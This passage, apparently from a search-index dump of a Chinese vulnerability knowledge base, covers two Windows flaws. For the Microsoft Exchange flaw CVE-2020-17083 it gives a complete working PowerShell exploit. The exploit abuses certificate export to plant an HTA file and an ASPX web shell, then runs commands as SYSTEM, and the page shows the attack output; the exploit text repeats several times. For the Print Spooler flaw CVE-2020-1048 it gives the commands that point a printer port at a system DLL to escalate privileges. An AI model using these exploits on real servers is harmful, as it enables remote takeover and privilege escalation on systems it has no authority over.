Groups/Organization Management, exchangedemo.com/Users/Admin} RoleAssignments : {Exchange Server Certificates-cert users} Roles : {Exchange Server Certificates} DisplayName : ExternalDirectoryObjectId : Members : {exchangedemo.com/Users/Harry Houdini} SamAccountName : cert users Description : RoleGroupType : Standard LinkedGroup : Capabilities : {} LinkedPartnerGroupId : LinkedPartnerOrganizationId : Identity : exchangedemo.com/Microsoft Exchange Security Groups/cert users IsValid : True ExchangeVersion : 0.10 (14.0.100.0) Name : cert users DistinguishedName : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com Guid : 6fb0b860-2cc2-4fe1-9489-d93dbbed8c9f ObjectCategory : exchangedemo.com/Configuration/Schema/Group ObjectClass : {top, group} WhenChanged : 6/12/2020 4:15:54 AM WhenCreated : 6/12/2020 1:34:51 AM WhenChangedUTC : 6/11/2020 8:15:54 PM WhenCreatedUTC : 6/11/2020 5:34:51 PM OrganizationId : Id : exchangedemo.com/Microsoft Exchange Security Groups/cert users OriginatingServer : DEAD01.exchangedemo.com ObjectState : Changed \u8fd0\u884c\u5982\u4e0b\u7684\u547d\u4ee4\u6267\u884c\u653b\u51fb PS C:\\Users\\researcher> .\\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123##-cmd mspaint (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harryh@exchangedemo.com:user123### (+) wrote to target file C:/Windows/Temp/rXq1U2tD.hta (+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/4VFQwc7W.aspx (+) shell written, executing command... (+) executed mspaint as SYSTEM! POC \u00b6 param ( [Parameter(Mandatory=$true)][string]$server, [Parameter(Mandatory=$true)][string]$usr, [Parameter(Mandatory=$true)][string]$pwd, [string]$cmd = \"mspaint\" ) Function Get-RandomAlphanumericString { [CmdletBinding()] Param ( [int] $length = 8 ) Process{ Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length | % {[char]$_}) ) } } function Writebad-File{ Param ( [string] $fn, [string] $content, [System.Management.Automation.Runspaces.PSSession] $session ) $selector = Get-RandomAlphanumericString Invoke-Command -Session $session -ScriptBlock { New-ExchangeCertificate -BinaryEncoded -GenerateRequest -SubjectName \"c=$Using:selector,o=$Using:content,cn=si\" } | Out-Null $thumb = Invoke-Command -Session $session -ScriptBlock { Get-ExchangeCertificate } | Where-Object -Property Subject -like \"*c=$selector*\" | select-object -Expand Thumbprint # this is where the file write is for this bug Invoke-Command -Session $session -ScriptBlock { Export-ExchangeCertificate -Thumbprint $Using:thumb -FileName $Using:fn -BinaryEncoded; } | Out-Null } function Exploit-Exchange { Param ( [string] $server, [string] $usr, [string] $pwd, [string] $cmd ) \"(+) targeting $server with ${usr}:$pwd\" $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd) $s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$server/PowerShell/ -Authentication Kerberos -Credential $creds $hta = Get-RandomAlphanumericString $aspx = Get-RandomAlphanumericString # write a hta file with commands Writebad-File -fn \"C:/Windows/Temp/$hta.hta\" -content \"<script>new ActiveXObject('WScript.Shell').Exec('cmd /c $cmd')</script>\" -session $s \"(+) wrote to target file C:/Windows/Temp/$hta.hta\" # write aspx file Writebad-File -fn \"C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" -content \"<%=System.Diagnostics.Process.Start(Request[Request.HttpMethod])%>\" -session $s \"(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" \"(+) shell written, executing command...\" $b = @{ destination = \"https://$server/ecp/$aspx.aspx?GET=C:/Windows/Temp/$hta.hta\" flags = '' username = $usr password = $pwd } $r = Invoke-WebRequest \"https://$server/owa/auth.owa\" -SessionVariable 'websess' -Body $b -Method 'POST' | Select-Object -Expand Forms if ([string]::IsNullOrWhiteSpace($r)) { \"(+) executed $cmd as SYSTEM!\" } else { \"(-) exploit failed\" } } Get-PSSession | Remove-PSSession Exploit-Exchange -server $server -usr $usr -pwd $pwd -cmd $cmd \u53c2\u8003 \u00b6 https://srcincite.io/pocs/cve-2020-17083.ps1.txt","title":"CVE 2020 17083 Microsoft Exchange Server\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#cve-2020-17083-microsoft-exchange-server-poc","text":"","title":"CVE-2020-17083 Microsoft Exchange Server\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#_1","text":"CVE-2020-17083\u662f\u5b58\u5728\u4e8eMicrosoft Exchange\u670d\u52a1\u5668\u4e2d\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002 CVE-2020-17083 CVSS:3.0 5.5/4.8CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L/E:U/RL:O/RC:C","title":"\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#_2","text":"\u6ce8\u610f\uff0c\u9700\u8981Exchange Server Certificates\u89d2\u8272\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u7528\u6237 harryh\uff0c\u67e5\u770bexchange\u670d\u52a1\u5668\u4e2d\u5173\u4e8eharryh\u7528\u6237\u7684\u4fe1\u606f [PS] C:\\Windows\\system32>New-RoleGroup -Name \"cert users\" -Roles \"Exchange Server Certificates\" -Members \"harryh\" Name AssignedRoles RoleAssignments ManagedBy ---- ------------- --------------- --------- cert users {Exchange Server Certificates} {Exchange Server Certificates-cert users} {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} [PS] C:\\Windows\\system32>Get-RoleGroup \"cert users\" | Format-List RunspaceId : a97d7e2c-d036-4bfc-b95c-4fabcb644160 ManagedBy : {exchangedemo.com/Microsoft Exchange Security Groups/Organization Management, exchangedemo.com/Users/Admin} RoleAssignments : {Exchange Server Certificates-cert users} Roles : {Exchange Server Certificates} DisplayName : ExternalDirectoryObjectId : Members : {exchangedemo.com/Users/Harry Houdini} SamAccountName : cert users Description : RoleGroupType : Standard LinkedGroup : Capabilities : {} LinkedPartnerGroupId : LinkedPartnerOrganizationId : Identity : exchangedemo.com/Microsoft Exchange Security Groups/cert users IsValid : True ExchangeVersion : 0.10 (14.0.100.0) Name : cert users DistinguishedName : CN=cert users,OU=Microsoft Exchange Security Groups,DC=exchangedemo,DC=com Guid : 6fb0b860-2cc2-4fe1-9489-d93dbbed8c9f ObjectCategory : exchangedemo.com/Configuration/Schema/Group ObjectClass : {top, group} WhenChanged : 6/12/2020 4:15:54 AM WhenCreated : 6/12/2020 1:34:51 AM WhenChangedUTC : 6/11/2020 8:15:54 PM WhenCreatedUTC : 6/11/2020 5:34:51 PM OrganizationId : Id : exchangedemo.com/Microsoft Exchange Security Groups/cert users OriginatingServer : DEAD01.exchangedemo.com ObjectState : Changed \u8fd0\u884c\u5982\u4e0b\u7684\u547d\u4ee4\u6267\u884c\u653b\u51fb PS C:\\Users\\researcher> .\\poc.ps1 -server WIN-0K4AOM2JIN6.exchangedemo.com -usr harryh@exchangedemo.com -pwd user123##-cmd mspaint (+) targeting WIN-0K4AOM2JIN6.exchangedemo.com with harryh@exchangedemo.com:user123### (+) wrote to target file C:/Windows/Temp/rXq1U2tD.hta (+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/4VFQwc7W.aspx (+) shell written, executing command... (+) executed mspaint as SYSTEM!","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#poc","text":"param ( [Parameter(Mandatory=$true)][string]$server, [Parameter(Mandatory=$true)][string]$usr, [Parameter(Mandatory=$true)][string]$pwd, [string]$cmd = \"mspaint\" ) Function Get-RandomAlphanumericString { [CmdletBinding()] Param ( [int] $length = 8 ) Process{ Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length | % {[char]$_}) ) } } function Writebad-File{ Param ( [string] $fn, [string] $content, [System.Management.Automation.Runspaces.PSSession] $session ) $selector = Get-RandomAlphanumericString Invoke-Command -Session $session -ScriptBlock { New-ExchangeCertificate -BinaryEncoded -GenerateRequest -SubjectName \"c=$Using:selector,o=$Using:content,cn=si\" } | Out-Null $thumb = Invoke-Command -Session $session -ScriptBlock { Get-ExchangeCertificate } | Where-Object -Property Subject -like \"*c=$selector*\" | select-object -Expand Thumbprint # this is where the file write is for this bug Invoke-Command -Session $session -ScriptBlock { Export-ExchangeCertificate -Thumbprint $Using:thumb -FileName $Using:fn -BinaryEncoded; } | Out-Null } function Exploit-Exchange { Param ( [string] $server, [string] $usr, [string] $pwd, [string] $cmd ) \"(+) targeting $server with ${usr}:$pwd\" $securepwd = ConvertTo-SecureString $pwd -AsPlainText -Force $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($usr, $securepwd) $s = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://$server/PowerShell/ -Authentication Kerberos -Credential $creds $hta = Get-RandomAlphanumericString $aspx = Get-RandomAlphanumericString # write a hta file with commands Writebad-File -fn \"C:/Windows/Temp/$hta.hta\" -content \"<script>new ActiveXObject('WScript.Shell').Exec('cmd /c $cmd')</script>\" -session $s \"(+) wrote to target file C:/Windows/Temp/$hta.hta\" # write aspx file Writebad-File -fn \"C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" -content \"<%=System.Diagnostics.Process.Start(Request[Request.HttpMethod])%>\" -session $s \"(+) wrote to target file C:/Program Files/Microsoft/Exchange Server/V15/ClientAccess/ecp/$aspx.aspx\" \"(+) shell written, executing command...\" $b = @{ destination = \"https://$server/ecp/$aspx.aspx?GET=C:/Windows/Temp/$hta.hta\" flags = '' username = $usr password = $pwd } $r = Invoke-WebRequest \"https://$server/owa/auth.owa\" -SessionVariable 'websess' -Body $b -Method 'POST' | Select-Object -Expand Forms if ([string]::IsNullOrWhiteSpace($r)) { \"(+) executed $cmd as SYSTEM!\" } else { \"(-) exploit failed\" } } Get-PSSession | Remove-PSSession Exploit-Exchange -server $server -usr $usr -pwd $pwd -cmd $cmd","title":"POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Exchange%20Server/CVE-2020-17083%20Microsoft%20Exchange%20Server%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20POC/#_3","text":"https://srcincite.io/pocs/cve-2020-17083.ps1.txt","title":"\u53c2\u8003"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/","text":"\u4eca\u5e745\u6708\uff0c\u5fae\u8f6f\u53d1\u5e03\u5b89\u5168\u8865\u4e01\u4ee5\u4fee\u8865Windows \u6253\u5370\u673a\u540e\u53f0\u5904\u7406\u7a0b\u5e8f\u9ad8\u5371\u672c\u5730\u63d0\u6743\u5347\u7ea7\u6f0f\u6d1e\uff0c\u7f16\u53f7CVE-2020-1048\u3002\u5b83\u53ef\u4ee5\u83b7\u53d6\u7cfb\u7edf\u7ba1\u7406\u5458\u6743\u9650\uff0c\u751a\u81f3\u90e8\u7f72\u6301\u4e45\u5316\u540e\u95e8\uff0c\u5f71\u54cd\u8303\u56f4\u81ea1996\u5e74\u4ee5\u6765\u53d1\u5e03(Windows NT 4)\u7684\u6240\u6709Windows\u7248\u672c\u3002\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u6838\u5fc3\u539f\u7406\u5728\u4e8ewindows\u6dfb\u52a0\u6253\u5370\u673a\u65f6\uff0c\u5bf9port name\u7684\u68c0\u67e5\u51fd\u6570\u53ef\u4ee5\u88ab\u7ed5\u8fc7\uff0c\u8bbe\u7f6e\u4e3a\u4efb\u610f\u6587\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u628a\u4efb\u610f\u5185\u5bb9\u8f93\u51fa\u5230port name\u5bf9\u5e94\u7684\u7cfb\u7edf\u6587\u4ef6(\u5982\u67d0\u4e2adll)\u4e2d\uff0c\u5b9e\u73b0\u6743\u9650\u63d0\u5347\u3002\u7ecf\u8fc7\u8865\u4e01\u540e\uff0c\u7d27\u968f\u5176\u540e\u7684CVE-2020-1337\u53c8\u6709\u59ff\u52bf\u53ef\u4ee5\u7ed5\u68c0\u67e5\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 Microsoft Windows 10 Windows 10 1607\u7248\u672c Windows 10 1709\u7248\u672c Windows 10 1803\u7248\u672c Windows 10 1809\u7248\u672c Windows 10 1903\u7248\u672c Windows 10 1909\u7248\u672c Windows 7 SP1 Windows 8.1 Windows RT 8.1 Windows Server 2008 SP2 Windows Server 2008 R2 SP1 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 Windows Server 2019 Windows Server 1803\u7248\u672c Windows Server 1903\u7248\u672c Windows Server 1909\u7248\u672c \u4fee\u590d\u5efa\u8bae \u5173\u6ce8\u5b98\u65b9\u53d1\u5e03\u7684\u8865\u4e01\u5347\u7ea7\u53ca\u65f6\u4fee\u590d\u6f0f\u6d1e\u3002 https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1048 POC PrintDemon-master \u4e86\u89e3\u9700\u8981\u5229\u7528\u6f0f\u6d1e\u524d\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f \u00b6 Printers, Drivers, Ports \u6253\u5370\u673a\u81f3\u5c11\u6709\u4e24\u4e2a\u8981\u7d20 \u6253\u5370\u673a\u7aef\u53e3 \u4f60\u53ef\u4ee5\u8ba4\u4e3a\u5b83\u662f\u73b0\u5728\u7684USB\u7aef\u53e3\uff0c\u751a\u81f3\u662fTCP/IP\u7aef\u53e3(\u548c\u5730\u5740)\uff0c\u6253\u5370\u673a\u53ef\u4ee5\u6253\u5370\u5230\u4e00\u4e2a\u6587\u4ef6(\u5728Windows 8\u53ca\u4ee5\u4e0a) \u6253\u5370\u673a\u9a71\u52a8\u7a0b\u5e8f \u8fd9\u66fe\u7ecf\u662f\u4e00\u4e2a\u5185\u6838\u6a21\u5f0f\u7ec4\u4ef6\uff0c\u4f46\u662f\u6709\u4e86\u65b0\u7684\"v4\"\u6a21\u578b\uff0c\u8fd9\u4e9b\u90fd\u662f\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u5b8c\u6210\u7684\uff0c\u5230\u73b0\u5728\u5df2\u7ecf\u8d85\u8fc7\u5341\u5e74 \u7531\u4e8e\u4ee5Spooler\u5b9e\u65bd\u7684\u670d\u52a1Spoolsv.exe\u5177\u6709SYSTEM\u7279\u6743\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u56e0\u6b64\u8fd9\u4e24\u4e2a\u8981\u7d20\u5438\u5f15\u4e86\u4eba\u4eec\u6267\u884c\u5404\u79cd\u6709\u8da3\u7684\u653b\u51fb\u3002 \u4e3a\u4e86\u4f7f\u6807\u51c6\u7528\u6237\u5e10\u6237\u66f4\u5bb9\u6613\u4f7f\u7528\uff0c\u5e76\u4e14\u7531\u4e8e\u8fd9\u4e9b\u5e10\u6237\u73b0\u5728\u4ee5\u7528\u6237\u6a21\u5f0f\u8fd0\u884c\uff0c\u53ea\u8981\u9a71\u52a8\u7a0b\u5e8f\u662f\u4e00\u4e2a \u9884\u5148\u5b58\u5728\u7684\uff0c\u5185\u7f6e\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6743\u5c31\u53ef\u4ee5\u5b89\u88c5\u4e00\u4e2a\u6253\u5370\u9a71\u52a8\u7a0b\u5e8f\u3002 Add-PrinterDriver` `-Name ``\"Generic / Text Only\" \u6dfb\u52a0\u4e00\u4e2a\u6253\u5370\u673a\u7aef\u53e3 Add-PrinterPort` `-Name ``\"C:\\windows\\tracing\\myport.txt\" Get-PrinterPort | ft Name \u53ef\u4ee5\u67e5\u770b\u5230\u6216\u8005\u67e5\u770b\u6ce8\u518c\u8868\u8fd9\u4e2a\u4f4d\u7f6e HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports \u5728peocessmointer\u76d1\u63a7\u4e2d\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u52a8\u4f5c\uff08\u53d1\u73b0\u6d4b\u8bd5\u51e0\u6b21\u622a\u56fe\u65f6\u641e\u6df7\u4e86\u6ca1\u6709\u539f\u6765\u7684\u56fe\u4e86\uff0c\u4e0b\u9762\u622a\u56fe\u4e2d\u7684C:\\windows\\test\\test.txt\u5b9e\u9645\u4e0a\u662fC:\\windows\\tracing\\myport.txt\uff09 \u7cfb\u7edf\u4e2d\u6dfb\u52a0\u4e00\u53f0\u65b0\u6253\u5370\u673a Add-Printer` `-Name ``\"PrintDemon\"` `-DriverName ``\"Generic / Text Only\"` `-PortName ``\"c:\\windows\\tracing\\myport.txt\" \u8f93\u51fa\u5230\u6587\u4ef6 \"Hello,Printer!\"` `| ``Out-Printer` `-Name ``\"PrintDemon\" \u6253\u5370\u5230\u5185\u5bb9\u5728c:\\windows\\tracing\\myport.txt\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u4e2a\u6587\u4ef6\u67e5\u770b\u4e00\u4e0b hiew\u6253\u5f00\u6587\u6863\u4f1a\u53d1\u73b0\u5185\u5bb9\u5b9e\u9645\u6bd4\u6211\u4eec\u8f93\u5165\u7684\u8981\u591a\uff0cPowerShell\u8ba4\u4e3a\u8fd9\u662f\u5b9e\u9645\u7684\u6253\u5370\u673a\u3002\u56e0\u6b64\u4f1a\u6309\u7167\u6587\u6863\u683c\u5f0f\u7684\u8fb9\u8ddd\uff0c\u4e3a\u9876\u90e8\u8fb9\u8ddd\u6dfb\u52a0\u4e86\u51e0\u884c\u65b0\u5185\u5bb9\u3002 \u8ba9\u6211\u4eec\u91cd\u65b0\u521b\u5efa\u65b0\u7684\u6587\u4ef6C:\\Windows\\System32\\Ualapi.dll\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u56e0\u4e3a\u9700\u8981\u7279\u7279\u6b8a\u7684\u6743\u9650\u6240\u4ee5\u4f1a\u88ab\u963b\u62e6 \u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7fwindows print spooler\u670d\u52a1\u5bf9\u7aef\u53e3\u7684\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u5f53\u524d\u7528\u6237\u65e0\u6cd5\u5c06\u5176\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u81ea\u5df1\u4e0d\u5177\u6709\u8bbf\u95ee\u6743\u9650\u7684\u8def\u5f84 \u521b\u5efa\u6587\u4ef6\u65f6\uff0c\u4f1a\u68c0\u67e5Token\u6743\u9650\u8fdb\u884c\u9a8c\u8bc1\uff0c\u540c\u65f6IDA\u4e2d\u4e5f\u80fd\u627e\u5230\u8fd9\u6bb5\u4ee3\u7801 \u4f46\u662f\u53ea\u6709\u5f53\u7528\u6237\u9009\u62e9\u4e86\u201c\u6253\u5370\u5230\u6587\u4ef6\u201d\u9009\u62e9\u6846\uff0c\u5728\u6253\u5370\u5bf9\u8bdd\u6846\u4e2d\u53ef\u4ee5\u770b\u5230\u3002 \u5728\u9009\u62e9\u5176\u4ed6\u5f62\u5f0f\u7684\u8f93\u51fa\u4f1a\u5b8c\u5168\u8df3\u8fc7\u6b64\u68c0\u67e5 Client Side Port Check Vulnerability (CVE-2020-1048) \u00b6 \u53ea\u9700\u8981\u4e00\u4e2aPowerShell\u547d\u4ee4 PowerShell\u4f7f\u7528add-printer\u547d\u4ee4\u5728\u5e95\u5c42\u5219\u662f\u76f4\u63a5\u8c03\u7528XcvData\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u53ef\u4ee5\u5c06port name\u8bbe\u7f6e\u4e3a\u4efb\u610f\u6587\u4ef6\u800c\u4e0d\u88ab\u68c0\u67e5 \u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002UI\u5bf9\u8bdd\u6846\u5177\u6709\u68c0\u67e5\u529f\u80fd\uff0c\u800cPowerShell\u7684WMI\u6253\u5370\u63d0\u4f9b\u7a0b\u5e8f\u6a21\u5757\u5219\u6ca1\u6709\u3002 \u53ea\u9700Add-PrinterPort -Name c:\\windows\\system32\\ualapi.dll\u5728PowerShell\u7a97\u53e3\u4e2d\u6267\u884c\u5373\u53ef","title":"CVE-2020-1048 Microsoft Windows Print Spooler\u63d0\u6743\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#_1","text":"Microsoft Windows 10 Windows 10 1607\u7248\u672c Windows 10 1709\u7248\u672c Windows 10 1803\u7248\u672c Windows 10 1809\u7248\u672c Windows 10 1903\u7248\u672c Windows 10 1909\u7248\u672c Windows 7 SP1 Windows 8.1 Windows RT 8.1 Windows Server 2008 SP2 Windows Server 2008 R2 SP1 Windows Server 2012 Windows Server 2012 R2 Windows Server 2016 Windows Server 2019 Windows Server 1803\u7248\u672c Windows Server 1903\u7248\u672c Windows Server 1909\u7248\u672c \u4fee\u590d\u5efa\u8bae \u5173\u6ce8\u5b98\u65b9\u53d1\u5e03\u7684\u8865\u4e01\u5347\u7ea7\u53ca\u65f6\u4fee\u590d\u6f0f\u6d1e\u3002 https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1048 POC PrintDemon-master","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Microsoft/Microsoft%20Windows%20Print%20Spooler/CVE-2020-1048%20Microsoft%20Windows%20Print%20Spooler%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#_2","text":"Printers, Drivers, Ports \u6253\u5370\u673a\u81f3\u5c11\u6709\u4e24\u4e2a\u8981\u7d20 \u6253\u5370\u673a\u7aef\u53e3 \u4f60\u53ef\u4ee5\u8ba4\u4e3a\u5b83\u662f\u73b0\u5728\u7684USB\u7aef\u53e3\uff0c\u751a\u81f3\u662fTCP/IP\u7aef\u53e3(\u548c\u5730\u5740)\uff0c\u6253\u5370\u673a\u53ef\u4ee5\u6253\u5370\u5230\u4e00\u4e2a\u6587\u4ef6(\u5728Windows 8\u53ca\u4ee5\u4e0a) \u6253\u5370\u673a\u9a71\u52a8\u7a0b\u5e8f \u8fd9\u66fe\u7ecf\u662f\u4e00\u4e2a\u5185\u6838\u6a21\u5f0f\u7ec4\u4ef6\uff0c\u4f46\u662f\u6709\u4e86\u65b0\u7684\"v4\"\u6a21\u578b\uff0c\u8fd9\u4e9b\u90fd\u662f\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u5b8c\u6210\u7684\uff0c\u5230\u73b0\u5728\u5df2\u7ecf\u8d85\u8fc7\u5341\u5e74 \u7531\u4e8e\u4ee5Spooler\u5b9e\u65bd\u7684\u670d\u52a1Spoolsv.exe\u5177\u6709SYSTEM\u7279\u6743\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u56e0\u6b64\u8fd9\u4e24\u4e2a\u8981\u7d20\u5438\u5f15\u4e86\u4eba\u4eec\u6267\u884c\u5404\u79cd\u6709\u8da3\u7684\u653b\u51fb\u3002 \u4e3a\u4e86\u4f7f\u6807\u51c6\u7528\u6237\u5e10\u6237\u66f4\u5bb9\u6613\u4f7f\u7528\uff0c\u5e76\u4e14\u7531\u4e8e\u8fd9\u4e9b\u5e10\u6237\u73b0\u5728\u4ee5\u7528\u6237\u6a21\u5f0f\u8fd0\u884c\uff0c\u53ea\u8981\u9a71\u52a8\u7a0b\u5e8f\u662f\u4e00\u4e2a \u9884\u5148\u5b58\u5728\u7684\uff0c\u5185\u7f6e\u9a71\u52a8\u7a0b\u5e8f\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6743\u5c31\u53ef\u4ee5\u5b89\u88c5\u4e00\u4e2a\u6253\u5370\u9a71\u52a8\u7a0b\u5e8f\u3002 Add-PrinterDriver` `-Name ``\"Generic / Text Only\" \u6dfb\u52a0\u4e00\u4e2a\u6253\u5370\u673a\u7aef\u53e3 Add-PrinterPort` `-Name ``\"C:\\windows\\tracing\\myport.txt\" Get-PrinterPort | ft Name \u53ef\u4ee5\u67e5\u770b\u5230\u6216\u8005\u67e5\u770b\u6ce8\u518c\u8868\u8fd9\u4e2a\u4f4d\u7f6e HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Ports \u5728peocessmointer\u76d1\u63a7\u4e2d\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u52a8\u4f5c\uff08\u53d1\u73b0\u6d4b\u8bd5\u51e0\u6b21\u622a\u56fe\u65f6\u641e\u6df7\u4e86\u6ca1\u6709\u539f\u6765\u7684\u56fe\u4e86\uff0c\u4e0b\u9762\u622a\u56fe\u4e2d\u7684C:\\windows\\test\\test.txt\u5b9e\u9645\u4e0a\u662fC:\\windows\\tracing\\myport.txt\uff09 \u7cfb\u7edf\u4e2d\u6dfb\u52a0\u4e00\u53f0\u65b0\u6253\u5370\u673a Add-Printer` `-Name ``\"PrintDemon\"` `-DriverName ``\"Generic / Text Only\"` `-PortName ``\"c:\\windows\\tracing\\myport.txt\" \u8f93\u51fa\u5230\u6587\u4ef6 \"Hello,Printer!\"` `| ``Out-Printer` `-Name ``\"PrintDemon\" \u6253\u5370\u5230\u5185\u5bb9\u5728c:\\windows\\tracing\\myport.txt\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u4e2a\u6587\u4ef6\u67e5\u770b\u4e00\u4e0b hiew\u6253\u5f00\u6587\u6863\u4f1a\u53d1\u73b0\u5185\u5bb9\u5b9e\u9645\u6bd4\u6211\u4eec\u8f93\u5165\u7684\u8981\u591a\uff0cPowerShell\u8ba4\u4e3a\u8fd9\u662f\u5b9e\u9645\u7684\u6253\u5370\u673a\u3002\u56e0\u6b64\u4f1a\u6309\u7167\u6587\u6863\u683c\u5f0f\u7684\u8fb9\u8ddd\uff0c\u4e3a\u9876\u90e8\u8fb9\u8ddd\u6dfb\u52a0\u4e86\u51e0\u884c\u65b0\u5185\u5bb9\u3002 \u8ba9\u6211\u4eec\u91cd\u65b0\u521b\u5efa\u65b0\u7684\u6587\u4ef6C:\\Windows\\System32\\Ualapi.dll\uff0c\u8fd9\u4e2a\u4f4d\u7f6e\u56e0\u4e3a\u9700\u8981\u7279\u7279\u6b8a\u7684\u6743\u9650\u6240\u4ee5\u4f1a\u88ab\u963b\u62e6 \u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7fwindows print spooler\u670d\u52a1\u5bf9\u7aef\u53e3\u7684\u5408\u6cd5\u6027\u6821\u9a8c\uff0c\u5f53\u524d\u7528\u6237\u65e0\u6cd5\u5c06\u5176\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u81ea\u5df1\u4e0d\u5177\u6709\u8bbf\u95ee\u6743\u9650\u7684\u8def\u5f84 \u521b\u5efa\u6587\u4ef6\u65f6\uff0c\u4f1a\u68c0\u67e5Token\u6743\u9650\u8fdb\u884c\u9a8c\u8bc1\uff0c\u540c\u65f6IDA\u4e2d\u4e5f\u80fd\u627e\u5230\u8fd9\u6bb5\u4ee3\u7801 \u4f46\u662f\u53ea\u6709\u5f53\u7528\u6237\u9009\u62e9\u4e86\u201c\u6253\u5370\u5230\u6587\u4ef6\u201d\u9009\u62e9\u6846\uff0c\u5728\u6253\u5370\u5bf9\u8bdd\u6846\u4e2d\u53ef\u4ee5\u770b\u5230\u3002 